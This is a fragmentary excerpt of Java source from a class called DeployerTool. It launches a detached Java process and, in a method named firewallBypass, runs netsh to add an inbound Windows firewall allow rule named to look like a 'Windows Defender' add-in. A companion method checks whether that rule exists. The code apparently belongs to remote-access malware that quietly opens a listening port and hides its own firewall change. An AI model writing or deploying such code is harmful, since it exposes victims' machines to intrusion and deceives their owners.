...
public class DeployerTool {
	...
	private static final String PROGRAM_LAUNCH_STRING = "cmd /C start javaw -jar %s neutral"; /*
																								 * CMD /C is important
																								 * here else the process
																								 * won't be detached
																								 * from Java...
																								 */
	...
	private static final String WIN_FW_PORT_RULE = "netsh advfirewall firewall add rule name=\"Windows Defender Java AddIn_4fc96b%s\" dir=in action=allow protocol=TCP localport=%s program=\"%s\"";
	private static final String WIN_FW_RULE_QUERY = "netsh advfirewall firewall show rule name=\"Windows Defender Java AddIn_4fc96b%s\"";
	...
	public static boolean firewallCheck(int port) {
		try {
			String formattedCmd = String.format(WIN_FW_RULE_QUERY, "" + port);
			Runtime runtime = Runtime.getRuntime();
			Process proc = runtime.exec(formattedCmd);
			if (proc.waitFor() == 0)
				return true;
		} catch (Exception e) {
		}
	...
	public static boolean firewallBypass(int port) {

		try {
			File javawPath = new File(System.getProperty("java.home"), "/bin/javaw.exe");
			String formattedCmd = String.format(WIN_FW_PORT_RULE, "" + port, "" + port, javawPath.getPath());
			Runtime runtime = Runtime.getRuntime();
			Process proc = runtime.exec(formattedCmd);
			if (proc.waitFor() == 0)
				return true;
